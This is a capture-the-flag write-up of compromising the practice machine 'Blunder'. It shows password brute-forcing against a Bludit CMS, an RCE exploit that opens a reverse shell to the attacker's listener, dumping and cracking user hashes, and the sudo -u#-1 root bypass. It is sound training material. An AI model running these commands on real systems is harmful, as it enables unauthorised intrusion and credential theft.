# Scan

```bash
ghost@localhost [23:26:51] [~/Documents/hacking/tj-null-boxes/blunder] [master *]
-> % rustscan -a $IP -- -sC -sV

Open 10.10.10.191:80

PORT   STATE SERVICE REASON  VERSION
80/tcp open  http    syn-ack Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Blunder | A blunder of interesting facts
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-generator: Blunder
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-favicon: Unknown favicon MD5: A0F0E5D852F0E3783AF700B6EE9D00DA
```


# 80

Looking through the website and the source code, it is running Bludit CMS. From GitHub repository, I can see how the source code looks like (https://github.com/bludit/bludit).

The Read Me file exists on the website as well (http://10.10.10.191/README.md). But I cannot find a file that explicitly says Bludit version. However, from CSS, there's a query parameter `3.9.2` so I guess it is running that version.

```html
<!-- Include Bootstrap CSS file bootstrap.css -->
<link rel="stylesheet" type="text/css" href="[http://10.10.10.191/bl-kernel/css/bootstrap.min.css?version=3.9.2](http://10.10.10.191/bl-kernel/css/bootstrap.min.css?version=3.9.2)">

<!-- Include CSS Styles from this theme -->
<link rel="stylesheet" type="text/css" href="[http://10.10.10.191/bl-themes/blogx/css/style.css?version=3.9.2](http://10.10.10.191/bl-themes/blogx/css/style.css?version=3.9.2)">
```

Actually, it defines version at `/bl-plugions/version/metadata.json` (http://10.10.10.191/bl-plugins/version/metadata.json).

```json
{
	"author": "Bludit",
	"email": "",
	"website": "https://plugins.bludit.com",
	"version": "3.9.2",
	"releaseDate": "2019-06-21",
	"license": "MIT",
	"compatible": "3.9.2",
	"notes": ""
}
```

There are quite a lot of exploits, Directory Traversal, Credential Brute-force, and RCE. 

RCE (https://github.com/0xkasra/CVE-2019-16113) requires credential so I start cracking password first (https://www.exploit-db.com/exploits/48942).

Before I can brute-force password, I need to find user.

```bash
ghost@localhost [15:37:02] [~/Documents/hacking/tj-null-boxes/blunder] [master *]
-> % feroxbuster -u http://$IP -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -k -x txt

200      GET      105l      303w     3281c http://10.10.10.191/about
200      GET      170l      918w     7562c http://10.10.10.191/0
301      GET        0l        0w        0c http://10.10.10.191/admin => http://10.10.10.191/admin/
401      GET        0l        0w        0c http://10.10.10.191/admin/ajax
200      GET        2l        4w       22c http://10.10.10.191/robots.txt
200      GET        4l       23w      118c http://10.10.10.191/todo.txt
200      GET      110l      387w     3960c http://10.10.10.191/usb
200      GET       21l      171w     1083c http://10.10.10.191/LICENSE
```

In `todo.txt` found a potential user `fergus` (http://10.10.10.191/todo.txt).

```bash
-Update the CMS
-Turn off FTP - DONE
-Remove old users - DONE
-Inform fergus that the new blog needs images - PENDING
```

The brute-force script cannot read `rockyou.txt`. It gives Unicode decode error. After some googling, found that using `errors='replace` fixes the issue.

```python
passfile = open(Password_list, encoding="utf-8", errors='replace').readlines()
```

However, no luck with rockyou.txt. So instead I created a custom wordlist using `cewl`.

```bash
ghost@localhost [16:05:52] [~/Documents/hacking/tj-null-boxes/blunder] [master *]
-> % cewl http://10.10.10.191 > cewl-passwords.txt
```

Found a credential this time.

```bash
ghost@localhost [16:10:53] [~/Documents/hacking/tj-null-boxes/blunder] [master *]
-> % python3 48942.py -l http://10.10.10.191/admin/login.php -u users.txt -p cewl-passwords.txt

[*] SUCCESS !!
[+] Use Credential -> fergus:RolandDeschain
```

Then I updated the script of RCE.

```python
... # line 64
		bruteforce_username = 'N'

... # line 67
	        get_username = 'fergus' # input("[ ~ ] What username should I use? (leave this to use admin as username): ")

... # line 82
            if get_username != '':
                # passwd_list = input("[ ~ ] Enter the location for password list: ")
                # print()
                # hacked_pass = password_bruteforce(target=target_url, wordlist=passwd_list, username=get_username)
                hacked_pass = "RolandDeschain"
```

run an exploit to get back reverse shell.

```bash
ghost@localhost [16:23:13] [~/Documents/hacking/tj-null-boxes/blunder] [master *]
-> % python3 rce.py

     _____      _    ______  _____  _____
    |  __ \    | |   | ___ \/  __ \|  ___|
    | |  \/ ___| |_  | |_/ /| /  \/| |__
    | | __ / _ \ __| |    / | |    |  __|
    | |_\ \  __/ |_ _| |\ \ | \__/\| |___
     \____/\___|\__(_)_| \_| \____/\____/

    This exploit combines CVE-2019-17240 & CVE-2019-16113 to gain remote shell on target.

    Created by: kisho64 (@h_a_m_i__)

Enter target URL (i.e. https://target.com): http://10.10.10.191
[ ~ ] Enter listener's IP: 10.10.14.3
[ ~ ] Enter listener's port: 4444
[...] Checking if the target is live...
[ + ] The target is live! We are good to go...

[...] Attempting to login now...
[ + ] Login succeed... We are good to go :)

[ + ] The payload GzvMRqmYZE.php has been uploaded...
[ + ] The payload .htaccess has been uploaded...

[...] Attempting to get a shell... @ http://10.10.10.191/bl-content/tmp/GzvMRqmYZE.php
```

Reverse shell on netcat.

```bash
ghost@localhost [16:19:05] [~/Documents/hacking/tj-null-boxes/blunder] [master *]
-> % nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.3] from (UNKNOWN) [10.10.10.191] 35804
bash: cannot set terminal process group (1278): Inappropriate ioctl for device
bash: no job control in this shell
www-data@blunder:/var/www/bludit-3.9.2/bl-content/tmp$
```


# User

There are 2 users (excluding root).

```bash
www-data@blunder:/var/www/bludit-3.9.2/bl-content/tmp$ ls /home
hugo
shaun

www-data@blunder:/var/www/bludit-3.9.2/bl-content/tmp$ cat /etc/passwd | grep -v 'false\|nologin'
root:x:0:0:root:/root:/bin/bash
sync:x:4:65534:sync:/bin:/bin/sync
shaun:x:1000:1000:blunder,,,:/home/shaun:/bin/bash
hugo:x:1001:1001:Hugo,1337,07,08,09:/home/hugo:/bin/bash
temp:x:1002:1002:,,,:/home/temp:/bin/bash
```

Under ls `bludit-3.9.2/bl-content/databases/users.txt` found 2 users.

```php
<?php defined('BLUDIT') or die('Bludit CMS.'); ?>
{
    "admin": {
        "nickname": "Admin",
        "firstName": "Administrator",
        "lastName": "",
        "role": "admin",
        "password": "bfcc887f62e36ea019e3295aafb8a3885966e265",
        "salt": "5dde2887e7aca",
        "email": "",
        "registered": "2019-11-27 07:40:55",
        "tokenRemember": "",
        "tokenAuth": "b380cb62057e9da47afce66b4615107d",
        "tokenAuthTTL": "2009-03-15 14:00",
        "twitter": "",
        "facebook": "",
        "instagram": "",
        "codepen": "",
        "linkedin": "",
        "github": "",
        "gitlab": ""
    },
    "fergus": {
        "firstName": "",
        "lastName": "",
        "nickname": "",
        "description": "",
        "role": "author",
        "password": "be5e169cdf51bd4c878ae89a0a89de9cc0c9d8c7",
        "salt": "jqxpjfnv",
        "email": "",
        "registered": "2019-11-27 13:26:44",
        "tokenRemember": "",
        "tokenAuth": "0e8011811356c0c5bd2211cba8c50471",
        "tokenAuthTTL": "2009-03-15 14:00",
        "twitter": "",
        "facebook": "",
        "codepen": "",
        "instagram": "",
        "github": "",
        "gitlab": "",
        "linkedin": "",
        "mastodon": ""
    }
}
```

I am not able to crack the password with hashcat. Under `bludit-3.10.0a/bl-content/databases.users/users.php` found another user.

```bash
<?php defined('BLUDIT') or die('Bludit CMS.'); ?>
{
    "admin": {
        "nickname": "Hugo",
        "firstName": "Hugo",
        "lastName": "",
        "role": "User",
        "password": "faca404fd5c0a31cf1897b823c695c85cffeb98d",
        "email": "",
        "registered": "2019-11-27 07:40:55",
        "tokenRemember": "",
        "tokenAuth": "b380cb62057e9da47afce66b4615107d",
        "tokenAuthTTL": "2009-03-15 14:00",
        "twitter": "",
        "facebook": "",
        "instagram": "",
        "codepen": "",
        "linkedin": "",
        "github": "",
        "gitlab": ""}
}
```

Again I cannot crack the password. So I used crackstation to crack instead and got password `Password120`.

```bash
www-data@blunder:/var/www/bludit-3.10.0a/bl-content/databases$ su hugo
Password: Password120

id
uid=1001(hugo) gid=1001(hugo) groups=1001(hugo)

python -c 'import pty; pty.spawn("/bin/bash")'

hugo@blunder:/var/www/bludit-3.10.0a/bl-content/databases$ cd ~

hugo@blunder:~$ cat user.txt
d88c42da65d18818d0e6fd5c9abcb661
```


# Privilege escalation

When I do `sudo -l` got the following result.

```bash
hugo@blunder:~$ sudo -l
Password: Password120

Matching Defaults entries for hugo on blunder:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User hugo may run the following commands on blunder:
    (ALL, !root) /bin/bash
```

It means not root (!root), so I can run `/bin/bash` as any users except root.

However, there's a vulnerability to bypass user restriction (https://blog.aquasec.com/cve-2019-14287-sudo-linux-vulnerability).

https://access.redhat.com/security/cve/cve-2019-14287

It affects sudo versions before 1.8.28 (https://www.cvedetails.com/cve/CVE-2019-14287).

Blunder is running `1.8.25p1` so it is vulnerable.

```bash
hugo@blunder:~$ sudo --version
Sudo version 1.8.25p1
Sudoers policy plugin version 1.8.25p1
Sudoers file grammar version 46
Sudoers I/O plugin version 1.8.25p1
```

When running sudo, you can enter username or user id (UID) with `-u` argument. Sudo uses 0, so I tried that and it failed. Vulnerability is with `-1` and sudo will treat that as root.

```bash
hugo@blunder:~$ sudo -u#0 /bin/bash
Sorry, user hugo is not allowed to execute '/bin/bash' as root on blunder.

hugo@blunder:~$ sudo -u#-1 /bin/bash

root@blunder:/home/hugo# cat /root/root.txt
288af12dc883d4fa65a8afb057846c51
```
